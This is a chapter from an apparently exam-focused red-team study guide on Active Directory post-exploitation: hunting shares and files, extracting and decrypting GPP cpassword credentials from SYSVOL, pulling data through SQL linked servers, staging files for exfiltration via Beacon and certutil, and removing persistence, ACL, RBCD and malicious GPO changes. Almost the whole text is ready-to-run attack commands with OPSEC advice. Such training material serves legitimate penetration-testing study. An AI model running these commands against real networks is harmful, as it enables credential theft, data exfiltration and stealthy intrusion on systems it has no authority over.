## 16. Data hunting, exfiltration, and cleanup

### 16.1 Find the data

```text
powerpick Get-NetFileServer
powerpick Find-DomainShare -CheckShareAccess
powerpick Invoke-ShareFinder -Verbose
powerpick Invoke-FileFinder -Verbose
powerpick Find-InterestingDomainShareFile -Include *.doc*,*.xls*,*.csv,*.ppt*,*.pdf,*.txt
```

| Target | Command |
|---|---|
| Open shares | `Find-DomainShare -CheckShareAccess` |
| Files by name/type | `Find-InterestingDomainShareFile -Include ...` |
| SMB browse | `ls \\<host>\<share>` · `dir \\<host>\<share>` |
| Local user data | `dir /s /b C:\Users\<user>\Documents` |
| Databases | SQL queries (Section 16.3) |
| GPO `cpassword` | Section 16.2 |

### 16.2 SYSVOL and `cpassword`

Group Policy Preferences can store a password encrypted with a **publicly known key**. It is trivially decryptable.

```text
findstr /S /I cpassword \\<dc>\sysvol\<domain>\policies\*.xml
type \\<dc>\sysvol\<domain>\policies\<GUID>\Machine\Preferences\Groups\Groups.xml

# Decrypt (PowerSploit / PowerView)
powershell-import C:\Tools\PowerSploit\Privesc\Get-GPPPassword.ps1
powerpick Get-GPPPassword
```

```text
# Or parse the Registry.pol from a GPO
download \\<dc>\sysvol\<domain>\policies\{<GUID>}\Machine\Registry.pol
powershell-import C:\Tools\Parse-PolFile.ps1
powerpick Parse-PolFile .\Registry.pol
```

**OPSEC:** reading SYSVOL is normal domain-user activity and usually low-noise. It is one of the best quiet wins.

### 16.3 SQL data and linked servers

```text
powerpick Get-SQLQuery -Instance "<sql-host>,1433" -Query "select @@version"
powerpick Get-SQLQuery -Instance "<sql-host>,1433" -Query "select name from sys.databases"
powerpick Get-SQLQuery -Instance "<sql-host>,1433" -Query "select * from <db>.dbo.<table>"

# Through a linked server
powerpick Get-SQLQuery -Instance "<sql1>,1433" -Query "select * from openquery(""<sql2>"", 'select * from information_schema.tables')"
powerpick Get-SQLQuery -Instance "<sql1>,1433" -Query "select * from openquery(""<sql2>"", 'select * from <db>.dbo.<table>')"
```

**OPSEC:** SQL queries are logged; large result sets and `openquery` across links are visible. Pull only what you need.

### 16.4 Staging and transfer

```text
# Beacon-native
download C:\Users\<user>\Desktop\evidence.zip
upload C:\Tools\tool.exe C:\Windows\Temp\tool.exe

# Small text output
powerpick gc \\<host>\<share>\file.csv | select -first 20

# Base64 for binary-safe transfer through a shell
certutil -encode C:\Windows\Temp\data.zip C:\Windows\Temp\data.b64
type C:\Windows\Temp\data.b64
```

**OPSEC:** every download is a file read/transfer; large transfers are noticeable. Compress and encrypt if the data is sensitive, and delete staged copies.

### 16.5 Cleanup

Run this before submitting. Public candidate reports show cleanup directly affects the OPSEC half.

```text
# Files
del C:\Windows\Temp\payload.exe
del C:\Windows\Temp\sam.hiv C:\Windows\Temp\system.hiv C:\Windows\Temp\security.hiv

# Services
sc stop <service>
sc delete <service>

# Scheduled tasks
schtasks /delete /tn "<task>" /f

# Registry persistence
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v <name> /f

# COM hijack
reg delete "HKCU\Software\Classes\CLSID\{<clsid>}" /f

# Firewall rules
powershell Remove-NetFirewallRule -DisplayName "8080-In"

# Tunnels and sessions
rportfwd stop 8080
socks stop
unlink
jobkill <id>
```

**Directory cleanup (if you changed AD):**

```text
# Remove an ACL you added
powerpick Remove-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <user> -Rights <right>

# Remove RBCD
powerpick Set-ADComputer -Identity <target> -PrincipalsAllowedToDelegateToAccount $null

# Remove shadow credentials
# Whisker clear /target:<target> /domain:<domain> /dc:<dc>

# Restore a GPO change
powerpick Remove-GPLink -Name "Evil GPO" -Target "OU=...,DC=..."
powerpick Remove-GPO -Name "Evil GPO"

# Restore a service binPath
sc config <service> binPath= "<original>"
```

**Do not:**
- Clear event logs.
- Delete logs or auditing policy.
- Leave golden tickets, skeleton keys, or DSRM changes in place unless persistence is the objective.
- Leave a beacon calling home after you finish.

### 16.6 Reporting (if your format requires it)

The current public reports describe no written report, but older formats and some retakes may require one. Keep a skeleton ready:

```text
1. Executive summary — objective, outcome, risk
2. Scope and RoE — hosts, restrictions, time
3. Attack narrative — foothold → privilege → lateral → objective
4. Evidence — screenshots, command output, timestamps
5. OPSEC notes — what each action left behind, what you cleaned
6. Findings and remediation — misconfigurations, detections, recommendations
7. Appendix — credentials/tickets used (redacted), tools, IOCs
```

Even without a report, keep the **action log**. It is your cleanup checklist and your OPSEC defence.

### 16.7 Final checklist

- [ ] Objective achieved and verified
- [ ] Action log complete (time, host, action, artifact)
- [ ] All payloads/tools/dumps/hives/certs deleted
- [ ] All services/tasks/registry keys/firewall rules removed
- [ ] All ACL/RBCD/shadow-credential/GPO changes reverted
- [ ] All extra beacons, SOCKS proxies, port forwards, tunnels closed
- [ ] No Defender/logging changes
- [ ] No beacon parented by `rundll32.exe` left running
- [ ] No restricted hosts with unexplained detections
- [ ] Pause/submit only after a final read of the RoE

